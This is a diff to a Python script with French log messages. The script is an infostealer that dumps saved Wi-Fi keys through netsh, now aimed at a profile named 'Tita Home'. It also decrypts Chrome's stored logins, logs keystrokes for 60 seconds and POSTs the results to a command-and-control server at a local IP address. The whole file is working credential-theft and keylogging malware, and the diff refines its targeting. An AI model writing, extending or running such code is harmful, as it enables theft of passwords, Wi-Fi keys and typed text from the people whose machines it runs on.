@@ -12,9 +12,12 @@ from pynput.keyboard import Listener
 
 def extract_wifi_creds():
     try:
-        print("Tentative d'extraction WiFi (admin requis)...")
+        print("Debut extraction WiFi (admin requis)...")
         profiles_output = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], text=True, stderr=subprocess.STDOUT)
-        print("Sortie netsh profiles:", profiles_output)
+        print("Sortie brute profiles:", profiles_output)
+        if "Tita Home" not in profiles_output:
+            print("Profil Tita Home non detecte")
+            return {"note": "Profil Tita Home non trouve"}
         wifi_data = {}
         current_profile = None
         for line in profiles_output.split('\n'):
@@ -22,28 +25,29 @@ def extract_wifi_creds():
             if line.startswith("All User Profile"):
                 current_profile = line.split(':')[1].strip()
                 print(f"Profil detecte: {current_profile}")
-                try:
-                    details = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', 'name="' + current_profile + '"', 'key=clear'], text=True, stderr=subprocess.STDOUT)
-                    print("Sortie netsh details:", details)
-                    for detail in details.split('\n'):
-                        if "Key Content" in detail:
-                            key_value = detail.split(':')[1].strip()
-                            if key_value:
-                                wifi_data[current_profile] = key_value
-                                print(f"Clé WiFi trouvee: {current_profile}: {key_value}")
-                except subprocess.CalledProcessError as e:
-                    print(f"Erreur pour {current_profile}: {e.output}")
-        return wifi_data if wifi_data else {"note": "Aucun mot de passe WiFi ou acces refuse (admin requis)"}
+                if current_profile == "Tita Home":
+                    try:
+                        details = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', 'name="' + current_profile + '"', 'key=clear'], text=True, stderr=subprocess.STDOUT)
+                        print("Sortie brute details:", details)
+                        for detail in details.split('\n'):
+                            if "Key Content" in detail:
+                                key_value = detail.split(':')[1].strip()
+                                if key_value:
+                                    wifi_data[current_profile] = key_value
+                                    print(f"Clé WiFi trouvee: {current_profile}: {key_value}")
+                    except subprocess.CalledProcessError as e:
+                        print(f"Erreur extraction pour {current_profile}: {e.output}")
+        return wifi_data if wifi_data else {"note": "Aucun mot de passe WiFi ou acces refuse"}
     except subprocess.CalledProcessError as e:
-        print(f"Erreur netsh generale: {e.output}")
+        print(f"Erreur commande netsh: {e.output}")
         return {"error": f"Commande netsh echouee: {e.output}"}
     except Exception as e:
-        print(f"Erreur inattendue WiFi: {e}")
+        print(f"Erreur generale WiFi: {e}")
         return {"error": f"Erreur inattendue: {e}"}
 
 def extract_browser_creds():
     try:
-        print("Tentative d'extraction Chrome...")
+        print("Debut extraction Chrome...")
         local_state_path = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Local State')
         with open(local_state_path, "r", encoding="utf-8") as f:
             local_state = json.loads(f.read())
@@ -53,8 +57,8 @@ def extract_browser_creds():
 
         chrome_db = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Default\Login Data')
         if not os.path.exists(chrome_db):
-            print("Chrome DB non trouve")
-            return [{"error": "Chrome DB not found"}]
+            print("Base de donnees Chrome non trouvee")
+            return [{"error": "Chrome DB non trouve"}]
         temp_db = os.path.expanduser(r'~\AppData\Local\Temp\LoginData.db')
         os.system(f'copy "{chrome_db}" "{temp_db}"')
         conn = sqlite3.connect(temp_db)
@@ -83,8 +87,8 @@ def extract_browser_creds():
         os.remove(temp_db)
         return credentials
     except Exception as e:
-        print(f"Erreur Chrome generale: {e}")
-        return [{"error": "Browser extraction failed"}]
+        print(f"Erreur generale Chrome: {e}")
+        return [{"error": "Extraction Chrome echouee"}]
 
 def capture_keystrokes(duration=60):
     keys = []
@@ -94,7 +98,7 @@ def capture_keystrokes(duration=60):
         except:
             pass
     with Listener(on_press=on_press) as listener:
-        print("Enregistrement des frappes pendant 60 secondes...")
+        print("Enregistrement des frappes pendant 60 secondes, tapez du texte...")
         time.sleep(duration)
         listener.stop()
     result = ''.join(keys)
@@ -104,7 +108,7 @@ def capture_keystrokes(duration=60):
 def send_to_c2(data):
     c2_url = "http://192.168.2.154:8080"
     try:
-        print(f"Envoi au C2: {data}")
+        print(f"Envoi des donnees au C2: {data}")
         requests.post(c2_url, json=data, timeout=10)
         print("Envoi au C2 reussi")
     except Exception as e:
